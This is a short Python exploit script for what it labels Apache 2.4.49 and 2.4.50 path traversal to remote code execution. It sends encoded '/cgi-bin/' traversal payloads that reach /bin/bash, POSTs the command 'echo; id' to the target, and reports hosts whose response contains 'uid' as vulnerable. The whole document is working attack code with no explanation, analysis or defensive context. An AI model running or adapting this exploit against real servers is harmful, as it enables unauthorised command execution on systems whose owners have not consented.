import os
import re
import sys
import time
import requests


def exploitRCE(payload, host):
    s = requests.Session()
    url = 'http://' + host + payload
    session = requests.Session()
    command = "echo; id"
    try:
        req = requests.Request('POST', url=url, data=command)
        prepare = req.prepare()
        prepare.url = url
        response = session.send(prepare, timeout=5)
        output = response.text
        if "uid" in output:
            print(f"Host {host} is vulnerable!")
    except Exception:
        pass


def exploit(ip, opt):
    apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
    apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
    payloads = [apache2449_payload, apache2450_payload]
    exploitRCE(payloads[opt], ip)
